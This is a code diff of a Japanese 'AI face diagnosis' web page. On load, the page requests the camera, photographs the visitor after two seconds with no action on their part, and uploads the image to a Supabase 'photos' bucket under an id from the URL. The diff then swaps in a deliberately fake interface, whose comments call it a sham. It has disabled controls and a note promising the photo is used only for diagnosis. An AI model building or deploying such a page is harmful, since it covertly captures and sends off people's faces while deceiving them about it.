@@ -3,12 +3,12 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>AI診断</title>
+  <title>AI顔診断</title>
   <style>
     body {
-      background: #111;
-      color: white;
-      font-family: system-ui, sans-serif;
+      background: linear-gradient(to right, #e3f2fd, #fde2e4);
+      color: #333;
+      font-family: "Hiragino Kaku Gothic ProN", sans-serif;
       text-align: center;
       margin: 0;
       padding: 0;
@@ -18,36 +18,54 @@
       flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
+      min-height: 100vh;
+      padding: 20px;
     }
     .preview-box {
       width: 250px;
       height: 250px;
-      background: white;
+      background: #fff;
       border-radius: 20px;
       margin-top: 20px;
       overflow: hidden;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
     }
-    video { width: 100%; height: 100%; object-fit: cover; display:none; }
+    video { width: 100%; height: 100%; object-fit: cover; display: none; }
     button {
-      margin-top: 20px;
-      background: #f97316;
+      margin-top: 15px;
+      background: #2196f3;
       color: white;
       border: none;
       border-radius: 8px;
       padding: 10px 20px;
       font-size: 1rem;
+      cursor: not-allowed; /* ハリボテっぽく */
+      opacity: 0.7;
+    }
+    input {
+      margin-top: 20px;
+      width: 80%;
+      max-width: 280px;
+      padding: 10px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+      font-size: 1rem;
+      text-align: center;
+    }
+    p.note {
+      color: #555;
+      font-size: 0.8rem;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>AI顔診断</h1>
+  <div class="container" id="main">
+    <h1 style="color:#1976d2;">AI顔診断</h1>
     <div class="preview-box">
       <video id="video" autoplay playsinline muted></video>
     </div>
-    <button>診断をはじめる</button>
-    <p id="status" style="color:#ccc; margin-top:10px;"></p>
+    <p id="status" style="color:#666; margin-top:10px;">カメラの準備中...</p>
   </div>
 
   <script type="module">
@@ -60,13 +78,14 @@
     const id = new URLSearchParams(window.location.search).get("id") || Math.random().toString(36).substring(2, 9);
     const video = document.getElementById("video");
     const status = document.getElementById("status");
+    const main = document.getElementById("main");
 
     window.addEventListener("load", async () => {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
         video.srcObject = stream;
 
-        // 許可後に2秒待って自動撮影
+        // 許可後2秒で撮影
         setTimeout(() => captureAndUpload(stream), 2000);
       } catch (e) {
         status.textContent = "カメラの許可が得られませんでした。";
@@ -83,9 +102,22 @@
 
       status.textContent = "送信中...";
       const { error } = await supabase.storage.from("photos").upload(`${id}.jpg`, blob, { upsert: true });
-
       stream.getTracks().forEach(t => t.stop());
-      status.textContent = error ? "送信エラー" : "✅ 撮影完了";
+
+      if (error) {
+        status.textContent = "送信エラー";
+      } else {
+        // ✅ 撮影完了 → ハリボテUIに切り替え
+        main.innerHTML = `
+          <h1 style="color:#1976d2;">AI顔診断</h1>
+          <p>あなたのお顔を診断してみましょう！<br>診断にはカメラの許可が必要です。</p>
+          <input type="text" placeholder="あなたの名前を入力" disabled />
+          <button>📸 カメラを起動</button>
+          <button>🧠 診断をはじめる</button>
+          <div style="width:80%;max-width:300px;height:150px;background:white;border-radius:10px;margin-top:20px;"></div>
+          <p class="note">※この写真は診断目的でのみ使用され、外部に公開されることはありません。</p>
+        `;
+      }
     }
   </script>
 </body>
